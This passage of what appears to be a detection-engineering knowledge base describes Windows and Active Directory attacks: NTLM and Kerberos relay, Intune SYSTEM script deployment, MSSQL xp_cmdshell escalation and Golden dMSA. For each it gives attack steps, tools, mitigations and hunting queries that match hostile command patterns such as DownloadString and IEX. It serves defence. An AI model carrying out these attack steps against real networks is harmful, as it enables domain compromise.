printerbug.py/SpoolSample, dfscoerce.py, Coercer, impacket rpcdump.py, Responder (multicast poisoning)","detect":"Detection signals: (1) an NTLM network logon (4624 Type3) on the relay target where the account is a machine account ($) but the source IP does not match that machine's real IP (i.e. the attacker relay IP). (2) Immediately followed by a scheduled-task registration (4698) by that same machine account, plus TaskScheduler-Operational 106/200/201, then a SYSTEM process (4688) whose parent is svchost/taskeng. (3) RPC connection pattern from the attacker host: TCP 135 (endpoint mapper) → high dynamic ports (49152-65535). (4) Coercion traces on the DC side (EFSRPC/RPRN/DFSNM RPC calls; MDI \"Suspected NTLM relay / coercion\"). Telemetry sources: security audit log (4624/4776/4698), TaskScheduler-Operational, EDR process/network/named-pipe events, Microsoft Defender for Identity.","events":"4624(Type3/NTLM 中継先), 4776(NTLM検証/DC), 4698(タスク登録), TaskScheduler-Operational 106/200/201, 4688(SYSTEM子プロセス/RCE)","mitigate":"(1) Retire/restrict NTLM: use \"Network security: Restrict NTLM\" to progressively block domain NTLM and enforce Kerberos. (2) Harden RPC endpoints: enforce RPC authentication level packet privacy (RPC_C_AUTHN_LEVEL_PKT_PRIVACY) and enable EPA (Extended Protection for Authentication) to defeat relaying. (3) Reduce the coercion surface: disable Print Spooler especially on DCs, stop the WebClient (WebDAV) service, apply MS-EFSRPC/DFSNM mitigations (e.g. KB5005413). (4) Enforce SMB signing (parallel defense) and channel binding. (5) Apply tiering to remove excessive machine-account local-admin rights and set RestrictReceivingNTLMTraffic on servers. (6) Firewall inbound 135 / dynamic RPC ports where not needed.","triage":"Black (malicious): on the relay target (SRV) security log, a 4624 Type3 (NTLM) succeeds for a machine account (e.g. A$) but the IpAddress is not A's real IP — it is the attacker relay IP; if within minutes the same SRV shows a 4698 registered by that same A$, followed by TaskScheduler-Operational 106/200 and a 4688 SYSTEM process parented by svchost/taskeng, that correlated timeline is black. Concurrent 4776 / coercion traces (EFSRPC etc.) as outbound auth on the DC raise confidence. White (benign): the same 4624 Type3 machine-account logon whose IpAddress matches the machine's real IP, with the 4698 task registered locally by a known tool (SCCM/monitoring agent/admin, SubjectUserName being an admin or SYSTEM originating on-host) and a legitimate registrar in the TaskScheduler log, is white. Patch deployment, GPO, and backup jobs routinely generate 4698, so absent the source-IP mismatch combined with a machine-account creator, treat it as white.","hunt":[{"plat":"Sentinel","t":"Machine-account NTLM logon immediately followed by task registration by the same account","q":"let relayLogon = SecurityEvent\n| where EventID == 4624 and LogonType == 3\n| where TargetUserName endswith \"$\"\n| project loginTime=TimeGenerated, Computer, RelayedAccount=TargetUserName, SourceIP=IpAddress;\nSecurityEvent\n| where EventID == 4698\n| project taskTime=TimeGenerated, Computer, Creator=SubjectUserName, TaskObj=ObjectName\n| join kind=inner relayLogon on Computer\n| where taskTime between (loginTime .. (loginTime + 5m))\n| where Creator =~ RelayedAccount\n| project taskTime, Computer, RelayedAccount, SourceIP, TaskObj\n| order by taskTime desc"},{"plat":"MDE","t":"SYSTEM child process from task execution (svchost/taskeng parent) indicating RCE","q":"DeviceProcessEvents\n| where InitiatingProcessFileName in~ (\"svchost.exe\",\"taskeng.exe\",\"taskhostw.exe\")\n| where AccountName in~ (\"system\",\"local service\",\"network service\")\n| where FileName in~ (\"cmd.exe\",\"powershell.exe\",\"rundll32.exe\",\"regsvr32.exe\",\"wscript.exe\",\"mshta.exe\")\n| where ProcessCommandLine has_any (\"-enc\",\"-e \",\"IEX\",\"DownloadString\",\"\\\\Temp\\\\\",\"http:\",\"\\\\\\\\\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName\n| order by Timestamp desc"},{"plat":"MDI","t":"Single machine account NTLM-authenticating from multiple source IPs (relay indicator)","q":"IdentityLogonEvents\n| where Protocol == \"Ntlm\"\n| where LogonType == \"Network\"\n| where AccountName endswith \"$\"\n| summarize srcIPs=dcount(IPAddress), ips=make_set(IPAddress,6), targets=make_set(TargetDeviceName,6) by AccountName, bin(Timestamp, 10m)\n| where srcIPs > 1\n| order by srcIPs desc"}],"huntcs":[{"plat":"Event Search","t":"Scheduled task registration with a suspicious exec command","q":"event_simpleName=ScheduledTaskRegistered\n| search TaskExecCommand=\"*cmd*\" OR TaskExecCommand=\"*powershell*\" OR TaskExecCommand=\"*rundll32*\" OR TaskExecCommand=\"*\\\\Temp\\\\*\" OR TaskExecCommand=\"*http*\"\n| stats count values(TaskExecCommand) as cmds by aid, ComputerName, TaskName\n| sort - count"},{"plat":"LogScale","t":"Machine-account remote NTLM (Type3) logon fanning out across source IPs","q":"#event_simpleName=UserLogon LogonType=3\n| UserName=/\\$$/\n| groupBy([UserName], function=([count(RemoteAddressIP4, as=srcIPs, distinct=true), collect([ComputerName, RemoteAddressIP4])]))\n| srcIPs>1\n| sort(srcIPs, order=desc)"}]},{"name":"RemoteKrbRelay (Kerberos Relay to DCOM/HTTP/LDAP/SMB)","aka":"RemoteKrbRelay, Kerberos relay, AP-REQ, cross-protocol","phase":"coercion","group":"ポイズニング/リレー/Coercion","mitre":"T1557, T1187","cve":"","sev":"High","summary":"RemoteKrbRelay is an advanced Kerberos relay framework that coerces a remote host's machine account into Kerberos authentication (AP-REQ) via vulnerable DCOM objects and cross-protocol relays the ticket to LDAP/HTTP(ADCS Web Enrollment)/SMB to set up RBCD, Shadow Credentials, or issue certificates — dangerous because it enables privilege escalation and domain compromise even where NTLM is disabled.","how":"Prerequisites: a low-privileged domain user (or machine account) plus DCOM RemoteLaunch/RemoteActivation rights on the victim host. The relay target must lack signing/channel-binding (LDAP signing off, ADCS ESC8 HTTP enrollment enabled, or SMB signing off). Steps: (1) Enumerate abusable DCOM objects (ServerAlive2/IStorageTrigger/RPC etc.) with Checker.exe (Checkerv2.0); the COM server must run as another user or SYSTEM, never as NT AUTHORITY\\LOCAL SERVICE. (2) Run RemoteKrbRelay.exe to stand up a rogue OXID resolver/relay listener on the attacker host and trigger DCOM authentication; the victim machine requests a TGS (4769) for an attacker-controlled SPN and sends the AP-REQ to the attacker. (3) Relay the Kerberos ticket: -m ldap writes msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD) or msDS-KeyCredentialLink (Shadow Credentials) to the DC over LDAP; -m http obtains a certificate from ADCS Web Enrollment (ESC8); -m smb establishes an SMB session. The core primitive is cross-protocol reuse of the AP-REQ, and DCOM OXID resolution lets the operator remotely coerce while sidestepping the SPN/target constraint.","tools":"RemoteKrbRelay (CICADA8/MzHmO), Checker.exe/Checkerv2.0, remoteKrbRelayx (Python), KrbRelay (cube0x0), KrbRelayUp, krbrelayx (dirkjanm), Rubeus, Certipy, Impacket (addcomputer/rbcd)","detect":"Focus on relay side-effects and anomalous auth paths rather than the (valid) tickets themselves: (1) a machine-account network logon (4624 Type 3) on the DC arriving from an attacker host IP that differs from that machine's real IP; (2) writes to msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD) or msDS-KeyCredentialLink (Shadow Credentials) (4742, and 5136 where DS object auditing is on) performed by a low-privileged principal or the computer itself; (3) certificate issuance on ADCS (4886/4887) for a subject/machine different from the requester (ESC8); (4) TGS requests (4769) for unexpected SPNs sourced from the victim host. Telemetry: DC Security log (4624/4742/4741/4769/5136), ADCS CA log (4886/4887), MDI IdentityDirectoryEvents (directory attribute changes)/IdentityLogonEvents, MDE DeviceLogonEvents/DeviceNetworkEvents (relay process on the attacker host).","events":"4769(Kerberos TGS要求), 4624(Type3 マシンアカウントログオン), 4742(msDS-AllowedToActOnBehalfOfOtherIdentity/msDS-KeyCredentialLink変更), 5136(ディレクトリオブジェクト属性変更), 4741(マシンアカウント作成), 4886/4887(ADCS証明書要求/発行 ESC8), 5145(SMB共有アクセス)","mitigate":"(1) Enforce LDAP signing and LDAP channel binding (CBT) on DCs to defeat relays to LDAP regardless of Kerberos/NTLM. (2) For ADCS Web Enrollment (ESC8), disable HTTP and require HTTPS with Extended Protection for Authentication (EPA); remove unneeded enrollment endpoints. (3) Enforce SMB signing on all hosts. (4) Harden DCOM: minimize RemoteLaunch/RemoteActivation rights on abusable DCOM objects and require RPC/DCOM packet authentication (RPC_C_AUTHN_LEVEL_PKT_INTEGRITY). (5) Set MachineAccountQuota=0 to block arbitrary machine-account creation (mitigates RBCD abuse). (6) Monitor and restrict changes to msDS-AllowedToActOnBehalfOfOtherIdentity/msDS-KeyCredentialLink to prevent Shadow-Credential writes against privileged objects. (7) Restrict external reachability to RPC endpoint mapper/OXID (TCP 135).","triage":"Black (malicious): on the DC, a 4742/5136 changing computer A's msDS-AllowedToActOnBehalfOfOtherIdentity (or msDS-KeyCredentialLink) that correlates with a same-time 4624 Type 3 (subject = A$) sourced from an attacker host IP, plus a 4769 from computer A for an SPN it never normally uses, is the full DCOM-coercion -> Kerberos-relay -> RBCD/Shadow-Cred chain = black. An ADCS 4886/4887 issuing a cert for a high-privilege subject different from the requester and correlating with a preceding HTTP connection from the attacker host is ESC8 relay = black. White (benign): a 4742 RBCD/KeyCredential change made from an approved admin workstation by a privileged admin account (help-desk Windows Hello for Business enrollment or cluster delegation setup), where the source IP is a registered admin host and any 4624 Type 3 source IP matches the computer's own real IP, is white. Certificate issuance via legitimate autoenrollment (requester == subject) is white. Decision axes: (a) principal and path of the attribute change, (b) whether the 4624 Type 3 source IP diverges from the target machine's real IP, (c) business validity of the 4769 SPN, (d) match between ADCS issued subject and requester.","hunt":[{"plat":"Sentinel","t":"RBCD/Shadow-Credential write correlated with machine logon from a foreign IP","q":"// Kerberos relay to LDAP: RBCD/KeyCredential write on the DC lined up with a machine-account Type3 logon from an unexpected IP\nlet attrChange = SecurityEvent\n| where EventID == 4742\n| where PrivilegeList has_any (\"AllowedToActOnBehalfOfOtherIdentity\",\"KeyCredentialLink\") or ObjectName has_any (\"AllowedToActOnBehalfOfOtherIdentity\",\"KeyCredentialLink\")\n| project ChangeTime=TimeGenerated, DC=Computer, TargetComputer=TargetUserName, Actor=SubjectUserName;\nlet relayLogon = SecurityEvent\n| where EventID == 4624 and LogonType == 3\n| where Account endswith \"$\"\n| project LogonTime=TimeGenerated, DC=Computer, MachineAcct=Account, SrcIP=IpAddress;\nattrChange\n| join kind=inner relayLogon on DC\n| where abs(datetime_diff('second', ChangeTime, LogonTime)) <= 120\n| where isnotempty(SrcIP) and SrcIP !in (\"-\",\"::1\",\"127.0.0.1\")\n| project ChangeTime, DC, TargetComputer, Actor, MachineAcct, SrcIP\n| order by ChangeTime desc"},{"plat":"MDE","t":"RemoteKrbRelay/Checker process on the attacker host plus outbound to 135/OXID","q":"// Relay tooling on the operator host: RemoteKrbRelay/Checker/krbrelay executing, optionally with -m ldap/http/smb\nDeviceProcessEvents\n| where FileName in~ (\"RemoteKrbRelay.exe\",\"Checker.exe\",\"KrbRelay.exe\",\"KrbRelayUp.exe\")\n    or ProcessCommandLine has_any (\"RemoteKrbRelay\",\"-clsid\",\"IStorageTrigger\",\"ServerAlive2\")\n    or (ProcessCommandLine has \"-m\" and ProcessCommandLine has_any (\"ldap\",\"http\",\"smb\",\"rbcd\",\"shadowcred\"))\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName\n| order by Timestamp desc"},{"plat":"MDI","t":"Delegation/key-credential attribute change plus Kerberos logon via MDI","q":"// MDI directory-side view of RBCD/Shadow-Cred writes; pair with the coerced machine's Kerberos logon\nlet dirChange = IdentityDirectoryEvents\n| where ActionType has \"Delegation\" or ActionType has \"credential\" or ActionType has \"attribute\"\n| project ChangeTime=Timestamp, Actor=AccountName, Target=TargetAccountUpn, DeviceName, ChangeIP=IPAddress;\nlet krbLogon = IdentityLogonEvents\n| where Protocol == \"Kerberos\"\n| project LogonTime=Timestamp, LogonAccount=AccountName, DeviceName, LogonIP=IPAddress, TargetDeviceName;\ndirChange\n| join kind=inner krbLogon on DeviceName\n| where abs(datetime_diff('second', ChangeTime, LogonTime)) <= 180\n| project ChangeTime, Actor, Target, DeviceName, ChangeIP, LogonAccount, LogonIP\n| order by ChangeTime desc"}],"huntcs":[{"plat":"Event Search","t":"Kerberos relay tool execution with DCOM trigger args on the attacker host","q":"event_simpleName=ProcessRollup2 (FileName IN (\"RemoteKrbRelay.exe\",\"Checker.exe\",\"KrbRelay.exe\",\"KrbRelayUp.exe\") OR CommandLine=\"*RemoteKrbRelay*\" OR CommandLine=\"*IStorageTrigger*\" OR CommandLine=\"*ServerAlive2*\" OR (CommandLine=\"*-m *\" AND CommandLine IN (\"*ldap*\",\"*http*\",\"*smb*\",\"*shadowcred*\",\"*rbcd*\"))) | stats count values(CommandLine) as cmd values(FileName) as tool by aid, ComputerName, UserName, ParentBaseFileName | sort - count"},{"plat":"Identity Protection","t":"DC-side RBCD/Shadow-Cred writes seen by Falcon Identity Protection","q":"// Falcon EDR does not collect DC LDAP directory writes (msDS-AllowedToActOnBehalfOfOtherIdentity / msDS-KeyCredentialLink). Use CrowdStrike Falcon Identity Protection: alert on 'Resource-Based Constrained Delegation' and 'Shadow Credentials / Key Trust' attribute modifications and on anomalous Kerberos service-ticket activity for a computer account, then pivot to the relay host with: event_simpleName=NetworkConnectIP4 RemotePort=135 | stats count by aid, ComputerName, RemoteAddressIP4"}]},{"name":"Intune / Endpoint Manager Deployment (Script & App as SYSTEM)","aka":"Intune, MEM, PowerShell scripts, Win32 app, proactive remediation","phase":"lateral","group":"管理インフラ悪用 (SCCM/WSUS/MSSQL)","mitre":"T1072, T1078.004","cve":"","sev":"High","summary":"With a compromised Intune / Endpoint Manager admin role, an attacker pushes PowerShell scripts, Win32 apps, or proactive remediation scripts to every enrolled device and has the Intune Management Extension run arbitrary code as SYSTEM — turning cloud control-plane write access into fleet-wide SYSTEM RCE and lateral movement.","how":"Prerequisite privilege: an Entra Intune Administrator / Global Administrator role, or delegated/app credentials that can write deviceManagementScripts, deviceHealthScripts, or mobileApps (e.g. DeviceManagementConfiguration.ReadWrite.All). Steps: (1) sign in to endpoint.microsoft.com or Microsoft Graph (graph.microsoft.com/beta/deviceManagement/) with a stolen token/credential; (2) create a PowerShell platform script (deviceManagementScripts), a proactive remediation (deviceHealthScripts), or an .intunewin Win32 app (mobileApps, packaged with IntuneWinAppUtil) configured runAsAccount=system, runAs64Bit=true; (3) assign it to the \"All Devices / All Users\" group; (4) on each host the Intune Management Extension (Microsoft.Management.Services.IntuneWindowsAgent.exe) downloads the payload to C:\\Program Files (x86)\\Microsoft Intune Management Extension\\Policies\\Scripts\\ on its ~1-hour cycle / next check-in and runs powershell.exe as NT AUTHORITY\\SYSTEM via AgentExecutor.exe. Core primitive: cloud RBAC *write* access is converted, through the MDM delivery path, into SYSTEM arbitrary execution on every enrolled endpoint. SpecterOps' Maestro automates the create/assign/execute chain from a token alone, headlessly.","tools":"Microsoft Graph / Graph PowerShell SDK, endpoint.microsoft.com (Intune admin center), Maestro (SpecterOps), ROADtools, AADInternals, TokenTactics, IntuneWinAppUtil (.intunewin), IntuneManagementExtension / AgentExecutor","detect":"Endpoint (MDE): powershell.exe/cmd.exe launched as SYSTEM with parent IntuneWindowsAgent.exe / AgentExecutor.exe and command lines containing -enc / DownloadString / IEX; .ps1 files dropped under C:\\Program Files (x86)\\Microsoft Intune Management Extension\\Policies\\Scripts\\; a fan-out where the same script executes across many hosts in a short window; PowerShell 4104 script-block logs. Cloud: Intune audit showing Create+Assign of a deviceManagementScript / deviceHealthScript / Win32 mobileApp by an admin who never touches Intune or acts off-hours; sign-in to Microsoft Intune / Graph from an anomalous IP; role add to Intune Administrator, or a new credential added to a service principal holding DeviceManagementConfiguration/Apps.ReadWrite.All.","events":"4688 & PowerShell 4104 (IntuneWindowsAgent/AgentExecutor→powershell を SYSTEM で実行), Intune監査(Create/Assign deviceManagementScript=PowerShellスクリプト), Intune監査(Create deviceHealthScript=Proactive Remediation), Intune監査(Create/Assign Win32 mobileApp), Entra監査(Add member to role: Intune Administrator), Entra監査(Add service principal credentials), Entraサインイン(Microsoft Intune / Microsoft Graph)","mitigate":"Minimize Intune Administrator / Global Admin and gate them behind PIM time-bound elevation with approval; enforce phishing-resistant MFA and Conditional Access; require Intune multi-admin approval (Access policies / admin approvals) for script and app changes; enable Intune audit logs and alert on script create/assign; regularly inventory deviceManagementScripts, deviceHealthScripts, and mobileApps; scope assignments with filters instead of All Devices; least-privilege Graph app permissions and monitor service-principal credential additions; use ASR rules and WDAC/App Control to constrain unsigned script execution.","triage":"Black: on host A, MDE DeviceProcessEvents shows InitiatingProcessFileName=AgentExecutor.exe (grandparent IntuneWindowsAgent.exe) launching powershell.exe with AccountName=system and ProcessCommandLine holding -enc / DownloadString; the same script fans out across dozens of hosts within 30 minutes. If this time-correlates with a CloudAppEvents/AuditLogs record of an admin who never touches Intune performing Create+Assign of a deviceManagementScript to All Devices from a foreign IP, it is malicious — confidence rises further if AuditLogs also shows an Intune Administrator role grant to that account or an Add-service-principal-credentials event. White: the identical IME→powershell-as-SYSTEM pattern is benign when a standing Intune admin deploys a signed/known-hash operational script from a corporate IP tied to a change ticket, and when proactive remediations run on their normal schedule repeatedly across many hosts. Deciding axes: who created/assigned, source IP, whether the script hash is known-good, and alignment with change management.","hunt":[{"plat":"MDE","t":"IME→powershell-as-SYSTEM fan-out across the fleet","q":"DeviceProcessEvents\n| where InitiatingProcessFileName in~ (\"AgentExecutor.exe\",\"IntuneWindowsAgent.exe\",\"Microsoft.Management.Services.IntuneWindowsAgent.exe\")\n| where FileName in~ (\"powershell.exe\",\"pwsh.exe\",\"cmd.exe\",\"cscript.exe\",\"wscript.exe\",\"mshta.exe\",\"rundll32.exe\")\n| where AccountName in~ (\"system\") or AccountDomain in~ (\"nt authority\")\n| where ProcessCommandLine has_any (\"-enc\",\"encodedcommand\",\"frombase64string\",\"downloadstring\",\"downloaddata\",\"invoke-webrequest\",\"iex\",\"invoke-expression\",\"-w hidden\",\"-nop\",\"bypass\",\"http://\",\"https://\")\n| summarize Hosts=dcount(DeviceName), Cmds=make_set(ProcessCommandLine,6) by bin(Timestamp,30m)\n| where Hosts >= 3\n| order by Hosts desc"},{"plat":"Sentinel","t":"Script/app Create+Assign by an admin with no prior Intune history","q":"let recent = CloudAppEvents\n| where Timestamp > ago(1d)\n| where Application has \"Intune\" or Application has \"Endpoint Manager\"\n| where ActionType has_any (\"deviceManagementScript\",\"deviceHealthScript\",\"mobileApp\",\"Win32LobApp\") and ActionType has_any (\"Create\",\"Patch\",\"assign\",\"Assignment\")\n| summarize Ops=make_set(ActionType,10), Targets=make_set(ObjectName,10), n=count() by AccountDisplayName, IPAddress, bin(Timestamp,1d);\nlet baseline = CloudAppEvents\n| where Timestamp between (ago(30d)..ago(1d))\n| where Application has \"Intune\"\n| summarize by AccountDisplayName;\nrecent | join kind=leftanti baseline on AccountDisplayName"},{"plat":"Entra","t":"Intune escalation: role grant / SP credential add","q":"AuditLogs\n| where OperationName in~ (\"Add member to role\",\"Add eligible member to role\",\"Add app role assignment to service principal\",\"Add service principal credentials\")\n| where tostring(TargetResources) has_any (\"Intune Administrator\",\"Global Administrator\",\"DeviceManagementConfiguration\",\"DeviceManagementApps\")\n| project TimeGenerated, OperationName, Result, Initiator=tostring(InitiatedBy), TargetResources\n| order by TimeGenerated desc"}],"huntcs":[{"plat":"Event Search","t":"IntuneWindowsAgent-spawned powershell running as SYSTEM, fanning out","q":"event_simpleName=ProcessRollup2 (ParentBaseFileName=AgentExecutor.exe OR ParentBaseFileName=IntuneWindowsAgent.exe OR GrandParentBaseFileName=IntuneWindowsAgent.exe) (FileName=powershell.exe OR FileName=pwsh.exe OR FileName=cmd.exe)\n| search CommandLine=\"*-enc*\" OR CommandLine=\"*DownloadString*\" OR CommandLine=\"*FromBase64String*\" OR CommandLine=\"*IEX*\" OR CommandLine=\"*hidden*\" OR CommandLine=\"*http*\"\n| stats dc(aid) as hosts values(CommandLine) as cmds values(UserName) as users values(IntegrityLevel) as integ by SHA256HashData\n| where hosts>=3"},{"plat":"Identity Protection","t":"Intune/Graph control-plane not in EDR → pivot to Identity Protection","q":"// The management-plane actions of this technique (Create+Assign of deviceManagementScript / deviceHealthScript / Win32 mobileApp via Graph/endpoint.microsoft.com) are Entra & Intune audit events that Falcon endpoint sensors do NOT collect.\n// Use Falcon Identity Protection to flag anomalous Intune Administrator / privileged Entra sign-in and role escalation for the actor account, then corroborate on-host with the ProcessRollup2 query above showing IntuneWindowsAgent.exe -> powershell SYSTEM fan-out on the enrolled fleet."}]},{"name":"MSSQL Command Execution & In-Server Privesc","aka":"xp_cmdshell, OLE Automation, CLR, TRUSTWORTHY, db_owner→sysadmin, EXECUTE AS","phase":"lateral","group":"管理インフラ悪用 (SCCM/WSUS/MSSQL)","mitre":"T1059, T1505.001","cve":"","sev":"High","summary":"Abuse of SQL Server command-execution primitives (xp_cmdshell / OLE Automation / CLR) to run OS commands as the service account, combined with in-instance privilege escalation (db_owner→sysadmin via a TRUSTWORTHY database or EXECUTE AS impersonation), turning a database server into a lateral-movement and privesc foothold.","how":"Prereq: any login to SQL Server (stolen sa/app SQL-auth creds, SQL injection, or Windows auth). Command primitives: (1) xp_cmdshell — as sysadmin, sp_configure 'show advanced options',1 then 'xp_cmdshell',1, and EXEC xp_cmdshell 'whoami' runs under the SQL Server service account. (2) OLE Automation via sp_OACreate 'wscript.shell' + sp_OAMethod. (3) CLR — sp_configure 'clr enabled',1, CREATE ASSEMBLY from hex DLL and a wrapping proc (SQL2017+ 'clr strict security' requires a signed assembly or TRUSTWORTHY+UNSAFE ASSEMBLY). (4) SQL Agent CmdExec/PowerShell subsystem jobs. Privesc: (A) if a database is TRUSTWORTHY ON and owned by a sysadmin (sa), a db_owner can CREATE PROCEDURE ... WITH EXECUTE AS OWNER that runs ALTER SERVER ROLE sysadmin ADD MEMBER / sp_addsrvrolemember to grant itself sysadmin. (B) with IMPERSONATE on a target login, EXECUTE AS LOGIN='sa'. (C) if the service account holds SeImpersonatePrivilege, a Potato technique escalates to SYSTEM. Operators automate discovery/execution with PowerUpSQL (Invoke-SQLAudit / Invoke-SQLOSCmd) or Impacket mssqlclient.py.","tools":"Impacket mssqlclient.py, PowerUpSQL, MSSQLPwner, SQLRecon, Metasploit (mssql_exec/mssql_payload), sqlmap, SSMS/HeidiSQL","detect":"The most reliable signal is the EDR process tree: sqlservr.exe spawning cmd.exe / powershell.exe / wscript.exe / cscript.exe (from xp_cmdshell, OLE Automation, or Agent jobs). Telemetry: DeviceProcessEvents (4688-equivalent); SQL Server error log (sp_configure changes, xp_cmdshell enablement, 18456 login failures); SQL Server Audit (server-role changes sp_addsrvrolemember/ALTER SERVER ROLE, EXECUTE AS, CREATE ASSEMBLY, DATABASE SET TRUSTWORTHY). Network: outbound traffic from sqlservr.exe or its spawned shell (payload download, C2, linked-server). CLR abuse surfaces as sqlservr.exe loading unsigned assemblies/DLLs (image load).","events":"4688(sqlservr.exe→cmd/powershell.exe生成), 4624(Type3 SQLホストへのWindows認証ネットワークログオン), 18456(SQLログイン失敗/Applicationログ), SQL Server Error Log(sp_configure・xp_cmdshell有効化), SQL Server Audit(sp_addsrvrolemember/ALTER SERVER ROLE・EXECUTE AS・CREATE ASSEMBLY・SET TRUSTWORTHY)","mitigate":"Keep xp_cmdshell, OLE Automation, and CLR disabled (sp_configure) and keep 'clr strict security' (SQL2017+) enabled. Do not set databases TRUSTWORTHY ON; where required, do not own them with a sysadmin/sa login. Least privilege: minimize sysadmin/db_owner grants and revoke unnecessary IMPERSONATE. Run the SQL Server service under a dedicated low-privilege (virtual/managed) account rather than LocalSystem to remove the SeImpersonate/Potato-to-SYSTEM path. Prefer Windows authentication over mixed mode; disable/rename sa. Enable SQL Server Audit for server-role changes, sp_configure, and module execution. Use EDR/WDAC application control to block sqlservr.exe from spawning cmd/powershell children. Network-segment the database server.","triage":"Black (malicious): on the DB host, DeviceProcessEvents/4688 shows InitiatingProcess=sqlservr.exe spawning cmd.exe/powershell.exe running whoami/net/nltest/certutil/-enc — xp_cmdshell/OLE/CLR abuse. Confirmed if the SQL error log just prior shows xp_cmdshell being enabled (sp_configure) and a login from an unfamiliar IP correlates. In SQL Server Audit, an EXECUTE AS OWNER procedure inside a TRUSTWORTHY database calling sp_addsrvrolemember/ALTER SERVER ROLE to add a non-admin login to sysadmin is the black signal for db_owner→sysadmin. A burst of 18456 indicates brute-force/sa enumeration. White (benign): CmdExec/PowerShell steps parented by sqlagent.exe (not sqlservr.exe) with known job names; a DBA using xp_cmdshell from a known admin workstation IP during business hours per a registered maintenance runbook; monitoring agents spawning processes. Discriminate by parent process (sqlservr vs sqlagent), command content, source IP, time-of-day, and whether sp_configure was changed.","hunt":[{"plat":"MDE","t":"sqlservr.exe spawning a shell (xp_cmdshell/OLE/CLR command execution)","q":"DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"sqlservr.exe\"\n| where FileName in~ (\"cmd.exe\",\"powershell.exe\",\"pwsh.exe\",\"wscript.exe\",\"cscript.exe\",\"bash.exe\")\n| extend Recon = ProcessCommandLine has_any (\"whoami\",\"net \",\"nltest\",\"reg \",\"certutil\",\"bitsadmin\",\"curl\",\"-enc\",\"Invoke-\",\"Add-MpPreference\",\"vssadmin\",\"rundll32\")\n| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine, Recon\n| sort by Timestamp desc"},{"plat":"MDE","t":"Aggregate distinct sqlservr child-process types per host to surface rare execution","q":"DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"sqlservr.exe\"\n| where FileName in~ (\"cmd.exe\",\"powershell.exe\",\"pwsh.exe\",\"wscript.exe\",\"cscript.exe\")\n| summarize Children=make_set(FileName,20), Cmds=make_set(ProcessCommandLine,20), n=count() by DeviceName, bin(Timestamp,1h)\n| where n > 0\n| sort by Timestamp desc"},{"plat":"MDE","t":"Outbound network from sqlservr.exe (payload download / C2 / linked-server)","q":"DeviceNetworkEvents\n| where InitiatingProcessFileName =~ \"sqlservr.exe\"\n| where ActionType == \"ConnectionSuccess\"\n| where not(ipv4_is_private(RemoteIP)) or RemotePort in (445,80,443,4444,8080)\n| summarize Ports=make_set(RemotePort,20), Urls=make_set(RemoteUrl,20), n=count() by DeviceName, RemoteIP\n| sort by n desc"}],"huntcs":[{"plat":"Event Search","t":"ProcessRollup2: cmd/powershell parented by sqlservr.exe","q":"event_simpleName=ProcessRollup2 ParentBaseFileName=sqlservr.exe (FileName=cmd.exe OR FileName=powershell.exe OR FileName=pwsh.exe OR FileName=wscript.exe OR FileName=cscript.exe)\n| stats count values(CommandLine) as cmds by aid, ComputerName, UserName, FileName\n| sort - count"},{"plat":"LogScale","t":"NetworkConnectIP4: outbound connections initiated by sqlservr.exe","q":"#event_simpleName=NetworkConnectIP4 ContextBaseFileName=sqlservr.exe\n| groupBy([aid,ComputerName,RemoteAddressIP4,RemotePort], function=count())\n| sort(_count, order=desc)"}]},{"name":"Golden dMSA (Offline dMSA Password via KDS Root Key)","aka":"Golden dMSA, ManagedPasswordId forge, KDS root key, delegated MSA","phase":"dominance","group":"支配・永続化","mitre":"T1555, T1098","cve":"","sev":"Critical","summary":"Golden dMSA steals the domain's KDS root key and forges the ManagedPasswordId to recompute the passwords of delegated/group Managed Service Accounts (dMSA/gMSA) entirely offline, giving an attacker a durable credential-minting backdoor over every current and future managed account.","how":"The prerequisite is obtaining the KDS root key, which requires Domain/Enterprise Admin or SYSTEM on a DC. The root key sits in the msKds-RootKeyData attribute under CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration and is read via privileged LDAP or exfiltrated with DCSync-style replication. With Windows Server 2025 dMSA, the ManagedPasswordId structure has low entropy and non-secret components, so the attacker enumerates target dMSA/gMSA objects, forges/brute-forces the ManagedPasswordId, and runs the same SP800-108 KDF used for gMSA/dMSA password derivation (root-key secret + account SID + ManagedPasswordId) fully offline to reconstruct the managed password / NT hash — with no DC interaction. Because the derived value is the account's real current password, it can be used directly for Kerberos/NTLM logon or pass-the-hash. Key primitive: an offline KDF over KDS root key × SID × forged ManagedPasswordId.","tools":"Semperis GoldenDMSA, GoldenGMSA, DSInternals (Get-ADKDSRootKey / ConvertFrom-ADManagedPasswordBlob), gMSADumper, GMSAPasswordReader, Mimikatz, ntdsutil/DCSync","detect":"The derivation itself is offline and leaves no trace, so detection relies on the surrounding observable events. (1) KDS root key read: 4662 on msKds-RootKeyData on a DC (requires SACL), or directory replication (DCSync) by a non-DC principal. (2) LDAP enumeration: anomalous queries against the Master Root Keys container, dMSA objects (msDS-DelegatedManagedServiceAccount) and msDS-ManagedPassword (MDI IdentityQueryEvents). (3) Tooling on the attacker host: GoldenDMSA/GoldenGMSA/DSInternals command lines (4688, EDR process events). (4) Abuse of the derived credential: Type 3 logon (4624) or Kerberos ticket requests (4769) by managed service accounts ($) that normally never log on interactively. Telemetry sources: DC Security log, MDI, EDR process/LDAP.","events":"4662(msKds-RootKeyData読取/レプリケーション), 4688(GoldenDMSA/DSInternals実行), 4624(Type3 PtH), 4769(dMSAチケット要求), MDI:Directory Services replication","mitigate":"(1) Tier-0 hygiene: tightly control DA/EA/DC access to remove the precondition for stealing the KDS root key. (2) Apply a SACL to CN=Master Root Keys (msKds-RootKeyData) and monitor 4662; minimize holders of replication rights (DS-Replication-Get-Changes-All) to catch DCSync. (3) On suspected compromise, create a new KDS root key and re-provision all gMSA/dMSA to invalidate credentials derivable from the old key. (4) Alert on interactive/network logons by managed service accounts and verify the source of any $-account Type 3/Kerberos use. (5) Remove unneeded dMSA/gMSA, enforce least privilege, and restrict DC privileged operations to JIT/PAW.","triage":"Black (malicious): On the DC Security log, a \"directory replication\" (4662 / MDI Directory Services replication) sourced from a non-DC user/admin account → shortly followed on that same host by 4688 for GoldenDMSA/GoldenGMSA/DSInternals → then a gMSA/dMSA $-account that never normally logs on producing 4624 Type 3 / 